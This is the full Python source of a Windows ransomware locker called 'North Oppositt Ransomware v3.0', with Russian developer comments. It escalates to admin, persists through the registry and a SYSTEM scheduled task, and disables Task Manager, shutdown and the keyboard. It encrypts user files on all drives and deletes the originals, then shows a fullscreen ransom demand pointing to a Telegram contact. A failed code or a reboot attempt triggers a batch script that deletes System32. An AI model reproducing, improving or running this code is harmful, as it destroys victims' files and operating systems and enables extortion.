import tkinter as tk
import os
import sys
import winreg as reg
import threading
import keyboard
# Бин: эти библиотеки обязательны для работы. Джек, проверь, что они стоят.
try:
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    from comtypes import CLSCTX_ALL
    from cryptography.fernet import Fernet
    import psutil
except ImportError:
    # Бин: Если библиотек нет, винлокер просто не запустится.
    sys.exit(1)

import time
import subprocess
import ctypes
import winsound
import hashlib
import random
import datetime
import atexit
import signal
from concurrent.futures import ThreadPoolExecutor
import string

# ============================================================
# ГЛОБАЛЬНЫЕ БЛОКИРОВКИ (Бин: Чтобы потоки не конфликтовали)
# ============================================================
count_lock = threading.Lock()
reg_lock = threading.Lock()

# ============================================================
# ПЕРЕХВАТ Ctrl+C
# ============================================================
signal.signal(signal.SIGINT, lambda s, f: None)

# ============================================================
# ПРОВЕРКА НА ЕДИНСТВЕННЫЙ ЭКЗЕМПЛЯР
# ============================================================
def check_single_instance():
    try:
        lock_file = os.path.join(os.environ['TEMP'], 'north_oppositt.lock')
        if os.path.exists(lock_file):
            with open(lock_file, 'r') as f:
                old_pid = int(f.read().strip())
            try:
                if psutil.pid_exists(old_pid):
                    sys.exit(0)
            except: pass
            os.remove(lock_file)
        with open(lock_file, 'w') as f:
            f.write(str(os.getpid()))
        atexit.register(lambda: os.remove(lock_file) if os.path.exists(lock_file) else None)
    except: pass

# ============================================================
# ЗВУК И РЕСУРСЫ
# ============================================================
def resource_path(relative_path):
    # Бин: Если компилим в EXE, ищем ресурсы внутри него
    base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
    return os.path.join(base_path, relative_path)

def play_music_loop(stop_flag):
    try:
        wav_path = resource_path("sound.wav")
        while not stop_flag.is_set():
            if os.path.exists(wav_path):
                # Бин: SND_ASYNC не блокирует поток
                winsound.PlaySound(wav_path, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
                stop_flag.wait(60) # Ждем минуту до следующей проверки
            else:
                # Бин: Если звука нет, бесим бипером
                winsound.MessageBeep(winsound.MB_ICONHAND)
                time.sleep(1)
    except: pass

# ============================================================
# ОПТИМИЗИРОВАННАЯ НАГРУЗКА НА ПК (Бин: Тормозим, но не вешаем)
# ============================================================
def cpu_load(stop_flag):
    x = random.randint(1, 1000)
    while not stop_flag.is_set():
        # Бин: SHA-256 — это хорошо, но давай не на 100% грузить
        x = hashlib.sha256(str(x).encode()).hexdigest()
        time.sleep(0.01) # Даем GUI дышать

def ram_load(stop_flag):
    data = []
    while not stop_flag.is_set():
        try:
            # Бин: Забиваем память, но контролируем размер
            if psutil.virtual_memory().percent < 90:
                data.append('x' * 10*1024*1024) # +10 МБ
            else:
                if len(data) > 2: data.pop(0) # Освобождаем, если совсем туго
        except: data = []
        time.sleep(0.5)

def disk_load(stop_flag):
    temp_dir = os.environ.get('TEMP', os.getcwd())
    f_path = os.path.join(temp_dir, 'north_temp_load.tmp')
    while not stop_flag.is_set():
        try:
            with open(f_path, 'wb') as f:
                # Бин: Пишем и удаляем 50 МБ
                f.write(os.urandom(50*1024*1024))
            if os.path.exists(f_path): os.remove(f_path)
        except: pass
        time.sleep(1)

def start_system_load(stop_flag):
    # Бин: Снизим количество потоков нагрузки, чтобы GUI жил
    threading.Thread(target=cpu_load, args=(stop_flag,), daemon=True).start()
    threading.Thread(target=ram_load, args=(stop_flag,), daemon=True).start()
    threading.Thread(target=disk_load, args=(stop_flag,), daemon=True).start()

# ============================================================
# СИСТЕМНЫЕ ОПЕРАЦИИ (Бин: То, что реально работает)
# ============================================================
def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def run_as_admin():
    if not is_admin():
        new_args = sys.argv + ['--admin']
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(new_args), None, 1)
        sys.exit(0)
    return True

def add_to_startup():
    try:
        if not getattr(sys, 'frozen', False): return # Не добавляем, если не EXE
        
        # Бин: Двойной удар — Реестр и Планировщик
        exe_path = sys.executable
        with reg_lock:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key, "SystemUpdateGuard", 0, reg.REG_SZ, exe_path)
            reg.CloseKey(key)
        
        task_name = "SystemUpdateGuard"
        subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc ONLOGON /ru "SYSTEM" /rl HIGHEST /f /delay 0000:00', 
                       shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass

def toggle_task_manager(disable=True):
    # Бин: Отключаем диспетчер задач
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        with reg_lock:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
            reg.SetValueEx(key, "DisableTaskMgr", 0, reg.REG_DWORD, 1 if disable else 0)
            reg.CloseKey(key)
    except: pass

def force_max_volume(stop_flag):
    try:
        # Бин: Нужна CoInitialize для каждого потока
        ctypes.windll.ole32.CoInitialize(None)
        devices = AudioUtilities.GetSpeakers()
        if not devices: return
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
        while not stop_flag.is_set():
            volume.SetMasterVolumeLevelScalar(1.0, None) # 100%
            time.sleep(0.5)
    except: pass

def block_keyboard():
    try:
        # Бин: Разрешаем только цифры и управление
        allowed = ['0','1','2','3','4','5','6','7','8','9','backspace','enter']
        keyboard.hook(lambda e: e.name in allowed, suppress=True)
    except: pass

def monitor_reboot_attempts(stop_flag):
    try:
        # Бин: Убираем кнопку выключения из меню Пуск
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with reg_lock:
            key = reg.CreateKey(reg.HKEY_CURRENT_USER, path)
            reg.SetValueEx(key, "NoClose", 0, reg.REG_DWORD, 1)
            reg.CloseKey(key)
    except: pass
    
    # Бин: Ждем попытки ребута и... ну ты понял
    while not stop_flag.is_set():
        for proc_name in ['shutdown.exe', 'logoff.exe']:
            if proc_name in (p.name().lower() for p in psutil.process_iter()):
                reboot_and_nuke()
        time.sleep(0.5)

# ============================================================
# ЯДЕРНЫЙ УДАР (Бин: Удаление System32)
# ============================================================
def reboot_and_nuke():
    # Бин: Создаем BAT, который убьет систему после ребута
    bat_path = os.path.join(os.environ['TEMP'], 'north_nuke.bat')
    try:
        with open(bat_path, 'w') as f:
            f.write(f'''@echo off
timeout /t 3 /nobreak >nul
takeown /f "C:\\Windows\\System32" /r /d y
icacls "C:\\Windows\\System32" /grant *S-1-1-0:F /t
rmdir /s /q "C:\\Windows\\System32"
del /f /q "%~f0"
''')
        # Бин: Добавляем BAT в автозапуск через Планировщик
        task_name = "System32NukeTask"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{bat_path}" /sc ONSTART /ru "SYSTEM" /rl HIGHEST /f'
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except: pass
    
    # Бин: Принудительный ребут
    os.system("shutdown /r /t 0 /f")
    sys.exit()

# ============================================================
# ШИФРОВАНИЕ И ФАЙЛЫ
# ============================================================
def create_fake_files(stop_flag):
    # Бин: Плодим мусор, чтобы забить диск
    counter = 0
    temp_dir = os.environ.get('TEMP', os.getcwd())
    while not stop_flag.is_set():
        try:
            f_path = os.path.join(temp_dir, f'system_{counter}_{random.randint(100,999)}.tmp')
            with open(f_path, 'wb') as f:
                f.write(os.urandom(1024 * 1024)) # 1 МБ
            counter += 1
            time.sleep(2)
        except: time.sleep(5)

def encrypt_single_file(args):
    path, fernet = args
    try:
        # Проверка: не шифруем ли мы сами себя или системные файлы
        if path.endswith(".north") or "Windows" in path or "NorthOppositt" in path:
            return 0
        with open(path, 'rb') as f: data = f.read()
        if not data: return 0 # Не шифруем пустые
        
        encrypted = fernet.encrypt(data)
        new_path = path + ".north"
        
        # Бин: Если файл с таким именем есть, добавляем индекс
        idx = 1
        base_p = new_path
        while os.path.exists(new_path):
            new_path = f"{base_p}_{idx}"
            idx += 1
            
        with open(new_path, 'wb') as f: f.write(encrypted)
        os.remove(path)
        return 1
    except: return 0

def continuous_encryption(stop_flag, fernet, encrypted_count_list):
    # Бин: Шифруем всё, что шевелится
    drives = ['C:\\', 'D:\\', 'E:\\', 'F:\\']
    valid_drives = [d for d in drives if os.path.exists(d)]
    
    while not stop_flag.is_set():
        try:
            files_to_encrypt = []
            for drive in valid_drives:
                for root, dirs, files in os.walk(drive, topdown=True):
                    # Бин: Скипаем системные папки, чтобы винда жила
                    dirs[:] = [d for d in dirs if d not in ['Windows', 'Program Files', 'Program Files (x86)', 'AppData']]
                    for file in files:
                        files_to_encrypt.append((os.path.join(root, file), fernet))
                        if len(files_to_encrypt) > 50: break # Бин: Не берем слишком много за раз
                    if len(files_to_encrypt) > 50: break
            
            if files_to_encrypt:
                # Бин: Используем 4 потока для шифрования (больше вешает систему)
                with ThreadPoolExecutor(max_workers=4) as executor:
                    results = executor.map(encrypt_single_file, files_to_encrypt)
                    new_count = sum(results)
                    # Бин: БЛОКИРОВКА для счетчика
                    with count_lock: encrypted_count_list[0] += new_count
            time.sleep(5) # Ждем перед следующим сканированием
        except: time.sleep(10)

# ============================================================
# РАСШИФРОВКА И ВОССТАНОВЛЕНИЕ
# ============================================================
def decrypt_single_file(args):
    path, fernet = args
    try:
        if not path.endswith(".north"): return 0
        with open(path, 'rb') as f: data = f.read()
        decrypted = fernet.decrypt(data)
        
        # Бин: Пытаемся восстановить оригинальное имя
        orig_path = path[:-6] # Убираем .north
        if os.path.exists(orig_path):
            # Бин: Если файл уже есть (например, жертва восстановила), добавляем индекс
            base, ext = os.path.splitext(orig_path)
            idx = 1
            while os.path.exists(f"{base}_restored_{idx}{ext}"): idx += 1
            orig_path = f"{base}_restored_{idx}{ext}"
            
        with open(orig_path, 'wb') as f: f.write(decrypted)
        os.remove(path)
        return 1
    except: return 0

def decrypt_all_files(fernet):
    files_to_decrypt = []
    # Бин: Ищем все наши .north файлы
    for drive in ['C:\\', 'D:\\', 'E:\\', 'F:\\']:
        if os.path.exists(drive):
            for root, dirs, files in os.walk(drive):
                for file in files:
                    if file.endswith(".north"):
                        files_to_decrypt.append((os.path.join(root, file), fernet))
    
    if not files_to_decrypt: return 0
    with ThreadPoolExecutor(max_workers=8) as executor:
        results = executor.map(decrypt_single_file, files_to_decrypt)
        return sum(results)

def restore_system():
    # Бин: Возвращаем всё как было
    toggle_task_manager(False)
    keyboard.unhook_all()
    # Восстанавливаем SafeMode и кнопку выключения
    try:
        path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        with reg_lock:
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_SET_VALUE)
            reg.DeleteValue(key, "NoClose")
            reg.CloseKey(key)
    except: pass

# ============================================================
# ГЛАВНЫЙ ИНТЕРФЕЙС (Бин: Твой дизайн, Джек. Я не трогал.)
# ============================================================
class NorthOpposittLocker:
    def __init__(self, root):
        self.root = root
        # Бин: Полноэкранный режим, поверх всех окон
        self.root.attributes("-fullscreen", True, "-topmost", True)
        self.root.configure(bg='#0a0a0a')
        self.root.protocol("WM_DELETE_WINDOW", lambda: self.factory_reset()) # Бин: Клоуз = Ребут
        
        self.attempts = 5
        self.stop_flag = threading.Event()
        self.encrypted_count = [0]
        
        # Бин: Системные блокировки
        check_single_instance()
        if is_admin():
            toggle_task_manager(True)
            block_keyboard()
            add_to_startup()
            # Бин: Монитор ребута только если админ
            threading.Thread(target=monitor_reboot_attempts, args=(self.stop_flag,), daemon=True).start()

        # Бин: Генерация ключа шифрования
        self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        
        # Бин: Запуск фоновых потоков
        threading.Thread(target=force_max_volume, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=play_music_loop, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=create_fake_files, args=(self.stop_flag,), daemon=True).start()
        threading.Thread(target=continuous_encryption, args=(self.stop_flag, self.fernet, self.encrypted_count), daemon=True).start()
        start_system_load(self.stop_flag)
        
        # Бин: Отрисовка GUI
        self.show_locker_screen()
        threading.Thread(target=self.timer_loop, daemon=True).start()
        self.update_file_count_loop()
        self.code_entry.focus_set() # Бин: Фокус на поле ввода

    def show_locker_screen(self):
        main_frame = tk.Frame(self.root, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both')
        
        # Бин: Пафосный логотип
        logo_text = """
    ╔═══════════════════════════════════════╗
    ║      NORTH OPPOSITT RANSOMWARE v3.0   ║
    ╚═══════════════════════════════════════╝
        """
        logo = tk.Label(main_frame, text=logo_text, fg="#ff4444", bg="#0a0a0a", 
                        font=("Courier", 14, "bold"), justify="center")
        logo.pack(pady=20)
        
        creators = tk.Label(main_frame, text="created by iaefeel & gflm", 
                            fg="#ff4444", bg="#0a0a0a", 
                            font=("Segoe UI", 9, "bold"), justify="center")
        creators.pack(pady=(0, 10))
        
        # Бин: Таймер
        self.timer_label = tk.Label(main_frame, text="⏰ ОСТАЛОСЬ ВРЕМЕНИ: 24:00:00", fg="#ffaa00", bg="#0a0a0a", font=("Segoe UI", 16, "bold"))
        self.timer_label.pack(pady=10)
        
        # Бин: Статистика
        self.attempts_label = tk.Label(main_frame, text=f"Попыток осталось: {self.attempts}", fg="#ffaa00", bg="#0a0a0a", font=("Segoe UI", 12, "bold"))
        self.attempts_label.pack(pady=5)
        self.file_count_label = tk.Label(main_frame, text="Зашифровано файлов: 0", fg="#00ff00", bg="#0a0a0a", font=("Segoe UI", 12))
        self.file_count_label.pack(pady=5)
        
        # Бин: Главный текст
        msg = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ❌ ВСЕ ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ! ❌                     ║
║                                                              ║
║   🔐 ДЛЯ ПОЛУЧЕНИЯ КОДА: Telegram @societyvoice             ║
║                                                              ║
║   ⚠️ 5 НЕВЕРНЫХ ПОПЫТОК = ПЕРЕЗАГРУЗКА + УДАЛЕНИЕ SYSTEM32   ║
║   ⚠️ ПОПЫТКА ПЕРЕЗАГРУЗИТЬ ПК = УДАЛЕНИЕ SYSTEM32           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        msg_label = tk.Label(main_frame, text=msg, fg="#cccccc", bg="#0a0a0a", 
                              font=("Consolas", 10), justify="center")
        msg_label.pack(pady=20)
        
        # Бин: Поле ввода
        input_frame = tk.Frame(main_frame, bg='#0a0a0a')
        input_frame.pack(pady=10)
        tk.Label(input_frame, text="ВВЕДИТЕ КОД:", fg="white", bg="#0a0a0a", font=("Segoe UI", 12, "bold")).pack(side="left", padx=5)
        self.code_entry = tk.Entry(input_frame, font=("Consolas", 14), width=15, justify='center', bg="#1a1a1a", fg="#00ff00", insertbackground="white")
        self.code_entry.pack(side="left", padx=5)
        
        # Бин: Кнопки
        button_frame = tk.Frame(main_frame, bg='#0a0a0a')
        button_frame.pack(pady=20)
        tk.Button(button_frame, text="🔓 РАСШИФРОВАТЬ", command=self.check_code, bg="#ff4444", fg="white", font=("Segoe UI", 11, "bold"), width=20).pack(side="left", padx=10)
        tk.Button(button_frame, text="💀 УНИЧТОЖИТЬ WINDOWS", command=self.factory_reset, bg="#333333", fg="white", font=("Segoe UI", 11, "bold"), width=20).pack(side="left", padx=10)

    # ============================================================
    # ЛОГИКА ИНТЕРФЕЙСА
    # ============================================================
    def timer_loop(self):
        # Бин: Таймер на 24 часа
        end_time = datetime.datetime.now() + datetime.timedelta(hours=24)
        while not self.stop_flag.is_set():
            time_left = (end_time - datetime.datetime.now()).total_seconds()
            if time_left <= 0: reboot_and_nuke()
            hours, rem = divmod(int(time_left), 3600)
            minutes, seconds = divmod(rem, 60)
            self.timer_label.config(text=f"⏰ ОСТАЛОСЬ ВРЕМЕНИ: {hours:02d}:{minutes:02d}:{seconds:02d}")
            time.sleep(1)

    def update_file_count_loop(self):
        while not self.stop_flag.is_set():
            # Бин: Берем счетчик с блокировкой
            with count_lock: count = self.encrypted_count[0]
            self.file_count_label.config(text=f"Зашифровано файлов: {count}")
            time.sleep(3)

    def check_code(self):
        # Бин: Тот самый секретный код.
        SECRET_CODE = "192837465"
        entered_code = self.code_entry.get().strip()
        
        if entered_code == SECRET_CODE:
            # Бин: УСПЕХ! Расшифровываем всё.
            self.stop_flag.set()
            winsound.PlaySound(None, winsound.SND_PURGE) # Выключаем звук
            decrypted_count = decrypt_all_files(self.fernet)
            restore_system()
            self.root.destroy()
        else:
            # Бин: ОШИБКА! Минус попытка.
            self.attempts -= 1
            self.attempts_label.config(text=f"Попыток осталось: {self.attempts}")
            self.code_entry.delete(0, tk.END)
            winsound.MessageBeep(winsound.MB_ICONERROR)
            if self.attempts <= 0: reboot_and_nuke()

    def factory_reset(self):
        reboot_and_nuke()

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    if '--admin' in sys.argv:
        # Бин: Если перезапущено как админ
        check_single_instance()
        root = tk.Tk()
        app = NorthOpposittLocker(root)
        root.mainloop()
    else:
        # Бин: Запрашиваем права админа
        run_as_admin()
